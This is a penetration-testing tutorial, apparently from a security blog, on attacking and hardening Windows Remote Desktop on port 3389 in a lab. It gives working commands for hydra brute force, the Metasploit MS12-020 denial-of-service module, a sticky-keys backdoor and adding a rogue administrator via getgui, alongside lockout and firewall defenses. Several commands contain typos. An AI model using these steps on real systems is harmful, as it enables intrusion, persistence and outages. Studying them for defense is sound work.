@@ -1,0 +1,108 @@
+
+Penetration Testing on Remote Desktop (Port 3389)
+
+In this article we are discussing Remote Desktop penetration testing in four scenarios. Through that we are trying to explain how an attacker can breach security in different- different scenario and what types of major step should take by admin while activating RDP services to resist against attack.
+Remote Desktop Protocol (RDP) also known as “Terminal Services Client” is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. RDP servers are built into Windows operating systems; by default, the server listens on TCP port 3389.  
+For more details visit Wikipedia.org
+Let’s starts!!!
+Suppose admin has allowed remote desktop service in his system for local network connection.
+
+Scanning RDP with nmap
+Attacker may take help of nmap to verify whether port 3389 is activated or not. For RDP penetration we are also using nmap in order to scan targeted system (192.168.0.102) for open RDP port.
+nmap -p 3389 192.168.0.102
+If remote desktop service is allowed then nmap will show OPEN as state for port 3389, as shown in given image.
+
+In order to connect with RDP we always need login credential as authenticated connection. A valid user can enter his username and password but an invalid user (attacker) cannot able to guess correct credential for login therefore they retrieve credential through brute force attack.
+We are using hydra to demonstrate brute force attack on RDP.
+Hydra: It is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.
+Open terminal in your kali Linux and type following command:
+Hydra –v –f -L /root/Desktop/user.txt -P /root/Desktop/dict.txt rdp://192.168.0.102
+From given below image you can read the username: ignite and password: 123456 which we have retrieve through brute force attack on port 3389.
+Using this credential attacker can login for Remote Desktop service.
+
+Admin can protect their network from brute force attack using Account lockout policy. Configure following policies under Security setting > Account policies > Account lockout policies
+Account Lockout duration: Policy which defines the time period that a locked out account remains locked until become automatically unlock by itself or reset by admin. It will lock the account for specified time when user will cross the login attempt set by account lockout threshold.
+Account lockout threshold: Policy which defines the number of fail logon attempt and will lock account for some period of time specified by Account lockout duration. It will allow maximum number of specified attempts for sing-in into your account.
+Rest Account lockout counter after: Policy which defines the time period that must elapse after a failed logon attempt. The reset time must be less than or equal to the Account lockout duration.
+
+Account Lockout duration: 30 minutes
+Account lockout threshold: 2 invalid logon attempts
+Rest Account lockout counter after: 30 minutes
+If the number of attempts is greater than the value of Account lockout threshold, the attacker could potentially lock every account.
+
+Now let’s test Account lockout policy by again making brute force attack on port 3389.
+hydra -v -f -l ignite-l ignite-P /root/Desktop/dict.txt rdp://192.168.0.102
+When attacker retrieves the username and password, he will surely use them for login but as you can see it took more than 2 attempts to crack the password therefore according to set policies the account should be get locked for 30 minutes.
+
+Let’s assure it by login into remote desktop
+Open the terminal and type “rdesktop 192.168.0.102 <target IP>” when you will get target screen, enter username and password which have retrieve from brute force.
+From given image you can observe that we have entered above discovered username and password ignite: 12345.
+
+When you (attacker) will submit your credential then it will give you a message that current account has been locked out and cannot be logon as shown in given image.
+This will lock the account of the user ignite for 30 minutes and hence admin will come to know that someone has tried brute force attack for unauthorized access.
+In this way we can protect brute force attack for unauthorized access.
+
+Many times in order to identify whether host is vulnerable to RDP or not, attacker use exploit MS12-020-check to test its strength.
+Open the terminal in your kali Linux and Load metasploit framework now type following command to scan for vulnerability.
+use auxiliary/scanner/rdp/ms12_020_check
+msf auxiliary(ms12_020_check) > set rhosts 192.168.0.102
+msf auxiliary(ms12_020_check) >set rport 3389
+msf auxiliary(ms12_020_check) > exploit
+From given image you can it is showing target is vulnerable, now you can use Google to find its exploit for attack.
+
+Once attack knows that target port 3389 is vulnerable MS12-020-check then he will surly try to make an attack with Ms12-0200maxchannelids. This will launch a DOS attack on target system.
+Now Type following command for DOS attack which will crash the system.
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+msf auxiliary(ms12_020_maxchannelids) > set rhost 192.168.0.102
+msf auxiliary(ms12_020_maxchannelids) > set rhost 3389
+msf auxiliary(ms12_020_maxchannelids) > exploit
+
+From given below image you can notice the target is system is being shutting down due some problem.
+Criminal executor of DoS attacks often target sites or services hosted on high-profile web servers such as banks or credit card payment gateways to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.
+
+If attacker has hacked victim system in which RDP service is  not enable then attacker himself can active this service using post exploitation module built by Rapid 7 inside metasploit.
+Now to perform this we must need a meterpreter session of target system. From given image you can notice that have already meterpreter session of target system.
+Here we have meterpreter session 1 through multi handler and session 2 from bypassuac for admin privileges.
+
+Now type following command for generation post exploitation to enable RDP service.
+use post/windows/manage/enable_rdp
+msf post(enable_rdp) > sessions
+msf post(enable_rdp) >exploit
+
+This module makes it possible to apply the ‘sticky keys’ hack to a session with appropriate rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP login screen or via a UAC confirmation dialog.
+use post/windows/manage/sticky_keys
+msf post(sticky_keys) > set sessions 2
+msf post(sticky_keys) >exploit
+
+Now connect with remote desktop using following command:
+rdesktop 192.168.0.102
+
+It will ask to submit the credential for login but we are not aware of it therefore we had lunched stick key attack above so that we can access victim command prompt by hitting 5 times shift key as shown in given image.
+
+When you are holding meterpreter session of victim’s system type following command which enable RDP service moreover set credential of your own choice.
+Meterpreter> run getgui-e-u raaz-p 1234
+From given image you can observe it has edited user raaz with password 1234 into “Remote Desktop Users” and in “Administrators”.  Now you can login with created user, connect with remote desktop using following command:
+rdesktop 192.168.0.102
+
+Enter username: raaz and password: 1234 for login.
+
+Awesome!!! We had successfully login into remote system.
+
+You can forward port 3389 on another port for increasing system security although to perform this in your window operating system explore following location through registry editor.
+Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+From given image you can see in the right panel port number is heighted, Click on it.
+
+Shift Port from 3389 to specific port number
+You will get an edit DWORD window where that you can edit 32 bit value. By default it will show d3d which is hexadecimal value for 3389.
+Replace 3389 value from another value of your choice such as 3314 and select hexadecimal as base which will convert 3314 into cf2.
+
+From given image you can see port 3314 is open now.
+
+Open window Firewall with Advance settings then move into its inbound rules and explore Remote Desktop (TCP-In) for domain profile for adding security filter by making some change in firewall setting.
+
+Allow traffic from specific IP
+After that it will open a window for changing its properties, click on scope. Here you will get two panels for type of connection establishes local and remote IP address. 
+In remote IP address choose 2nd option for specific IP address and enter an IP to which you want to allow for connecting remote desktop services as shown in given image.
+It will stop all traffic coming from another IPs and increase the security of your network against any kind of attack.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
